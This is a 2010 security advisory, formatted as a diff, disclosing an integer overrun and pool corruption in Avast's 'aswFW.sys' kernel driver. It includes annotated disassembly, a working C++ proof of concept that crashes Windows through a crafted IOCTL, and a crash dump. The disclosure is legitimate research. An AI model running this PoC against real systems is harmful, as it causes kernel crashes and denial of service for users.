@@ -1,0 +1,173 @@
++-------------------------------------------------------------------------------------+
+| Avast! Internet Security 5.0 'aswFW.sys' kernel driver IOCTL Memory Pool Corruption |
++-------------------------------------------------------------------------------------+
+
+Tested Platform: Avast! Internet Security 5.0 ( Korean Trial )
+Affacted File info: 'aswFW.sys' 5.0.594.0
+Type: Local
+Impact: Denial Of Service ( kernel panic )
+Vendor: http://www.avast.com
+Author: x90c of InetCop Security ( x90c.org, geinblues@gmail.com )
+
+======================
+Vulnerability Summary:
+======================
+The IOCTL call 0x829C0964(IOCTL_ASWFW_COMM_PIDINFO_RESULTS) of 'aswFW.sys' kernel driver 
+Shiped with 'Avast! Internet Security 5.0' uses the user controlled First 4 bytes value 
+To allocate a NonPagedPool without any value range checking then an integer overrun occurs.
+
+If 'aswFW.sys' received a first 4 bytes about to '0xFFFFFFFF' with an Irp then an invalid 
+Sized Memory Pool allocated.
+
+After the invalid allocation, the kernel driver copys user controlled buffer into 
+'[allocated pool+84h]' with too large copy length '0FFFFFFFFh' then the Memory Pool corrupted.
+
+=================
+Technical Detail:
+=================
+.text:000114B0 ; int __stdcall sub_114B0(int, PIRP Irp)
+[...]
+.text:00011529    mov edi, [ebp+Irp] ; edi = Irp
+[...]
+.text:000115A9    mov edi, [edi+0Ch] ; edi = [edi+0Ch] ( User Controlled Buffer of Irp )
+[...]
+.text:000115CF    sub eax, 0Ch
+.text:000115D2    jz short to_IOCTL_Request ; jump into (1)
+[...]
+.text:00011626 to_IOCTL_Request: ; <-- (1)
+.text:00011626    mov eax, [ebx+0Ch] ; eax = IOCTL Code
+[...]
+.text:00011629    cmp eax, edx
+.text:0001162B    jz to_ioctl_code_829C0964h ; IOCTL Code == 829C0964h ? jump into (2)
+[...]
+.text:000116BA to_ioctl_code_829C0964h: ; <-- (2)
+.text:000116BA    call sub_18D68 ; returned 0.
+.text:000116BF    test eax, eax
+.text:000116C1    jz short loc_116E3 ; jump into (3)
+[...]
+.text:000116E3 loc_116E3: ; <-- (3)
+[...]
+.text:000116FC    push dword ptr [edi] ; [edi] = 0FFFFFFFF ( User Controlled Buffer of Irp )
+.text:000116FE    push 0
+.text:00011700    call NonPagedPool_alloc_1AB32 ; call (4) 
+                                                ; kd> bl
+						; 0 e b2d36700     0001 (0001) aswFW+0x1700
+[...]
+==============================================================================================
+.text:0001AB32 NonPagedPool_alloc_1AB32 proc near ; <-- (4)
+[...]
+.text:0001AB37    mov eax, [ebp+0Ch] ; eax = 0FFFFFFFFh ( Second param )
+.text:0001AB3A    push ebx
+.text:0001AB3B    push 74527741h ; Tag
+.text:0001AB40    add eax, 88h ; 0FFFFFFFFh + 88h ( 0x87, result of Integer Overrun )
+.text:0001AB45    push eax ; Size to allocate ( 0x87 )
+.text:0001AB46    push 0 ; PoolType ( 0 = NonPagedPool )
+.text:0001AB48    call ds:ExAllocatePoolWithTag ; Invalid Memory Pool allocated.
+.text:0001AB4E    mov ebx, eax ; ebx = eax
+[...]
+.text:0001AB7F    mov eax, ebx
+.text:0001AB83    retn 8 ; return with an Invalid Memory Pool. return into (5)
+==============================================================================================
+   
+// Integer Overrun.
+_87bytes_NonPagedPool = ExAllocatePoolWithTag(0, 0xFFFFFFFF + 0x88, 0x74527741); 
+
+.text:000116E3 loc_116E3:
+[...]
+.text:00011705    mov esi, eax ; <-- (5) esi = eax = Invalid Memory Pool.
+.text:00011707    test esi, esi
+.text:00011709    jz to_Epilog ; esi == 0 ?
+[...]
+.text:00011727    push dword ptr [edi] ; copy size == 0FFFFFFFFh ( too large )
+.text:00011729    lea eax, [esi+84h] ; eax = [esi+84h] == [Invalid Memory Pool Allocated + 84h]
+.text:0001172F    push edi ; src == User Controlled Buffer of Irp ( FFFFFFFF ... )
+.text:00011730    push eax ; dest == eax
+.text:00011731    call memcpy ; Memory Corruption Occurs.
+
+// Memory Pool Corruption.
+memcpy((_87bytes_NonPagedPool+0x84), User Controlled Buffer of Irp, 0xFFFFFFFF);
+
+=================
+Proof of Concept:
+=================
+
+[ avast_5.0_aswFW_poc.cpp ] --
+#include "stdafx.h"
+#include "windows.h"
+#include "winioctl.h"
+#include "stdio.h"
+
+int main(void)
+{
+  HANDLE hFile = NULL;
+  ULONG ioctl_code = 0;
+  CHAR outBuf[32];
+  CHAR rpt_inBuf[102400];
+  DWORD dwRet = 0, ret = 0;
+
+  hFile = CreateFile("\\\\.\\aswFW", FILE_SHARE_READ | FILE_SHARE_WRITE,
+                     0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,
+                     NULL);
+  if(hFile == INVALID_HANDLE_VALUE){
+        fprintf(stderr, "failed to open 'aswFW.sys' kernel driver!\n");
+	return(-1);
+  } 
+
+  rpt_inBuf[0] = '\xff'; // first 4 byte wiil uses calculate 
+  rpt_inBuf[1] = '\xff'; // allication size of ExAllocatePoolWithTag.
+  rpt_inBuf[2] = '\xff'; // and it is [Irp+0Ch] as User Controlled Buffer.
+  rpt_inBuf[3] = '\xff';
+  memset((rpt_inBuf+4), 0xff, 102394);
+
+  // IOCTL Code = 0x829C0964 ( IOCTL_ASWFW_COMM_PIDINFO_RESULTS )
+  // ( another IOCTL Code also vulnerable )
+  ret = DeviceIoControl(hFile, 0x829C0964,
+        (PVOID)rpt_inBuf, 102398, outBuf, 32, &dwRet, NULL); 
+
+  return 0;
+}
+// -- eoc --
+
+===============
+Exploitability:
+===============
+It's hard to exploit because 'too large copy length'. I saw *once eip register pointers 
+At 0x1000 but the controlling eip register is not consistent. ( DoS )
+--
+STACK_TEXT:  
+f8ac5944 804f9bad 00000003 f8ac5ca0 00000000 nt!RtlpBreakWithStatusInstruction
+f8ac5990 804fa79a 00000003 00001000 00001000 nt!KiBugCheckDebugBreak+0x19
+f8ac5d70 805426bb 0000000a 00001000 00000009 nt!KeBugCheck2+0x574
+f8ac5d70 00001000 0000000a 00001000 00000009 nt!KiTrap0E+0x233
+WARNING: Frame IP not in any known module. Following frames may be wrong.
+f8ac5e00 f871bf6c 00000001 00000200 0000011c 0x1000
+f8ac5e58 8054357d 81d6fd98 81e72af8 00010009 i8042prt!I8042KeyboardInterruptService+0x100
+f8ac5e58 804fcd56 81d6fd98 81e72af8 00010009 nt!KiInterruptDispatch+0x3d
+f8ac5f00 f8502ab6 81da5b60 0006bd78 81da5bb8 nt!KeRemoveByKeyDeviceQueue+0x2e
+f8ac5f20 f850423b 81daa0e8 81da5bb8 81da5c60 atapi!GetNextLuRequest+0x7c
+f8ac5f54 f8504c8e 81df7e70 81da5c60 f8ac5fcf atapi!IdeProcessCompletedRequest+0x1a3
+f8ac5fd0 80543bbd 81daa0a4 81daa030 00000000 atapi!IdePortCompletionDpc+0x204
+f8ac5ff4 8054388a b20e7b44 00000000 00000000 nt!KiRetireDpcList+0x46
+f8ac5ff8 b20e7b44 00000000 00000000 00000000 nt!KiDispatchInterrupt+0x2a
+8054388a 00000000 00000009 bb835675 00000128 0xb20e7b44
+--
+
+=========
+Solution:
+=========
+Not yet.
+
+==============
+Vendor Status:
+==============
+2010/08/02 - Vendor notified.
+2010/08/03 - Public Disclosed.
+
+
+
+
+
+
+
+
+
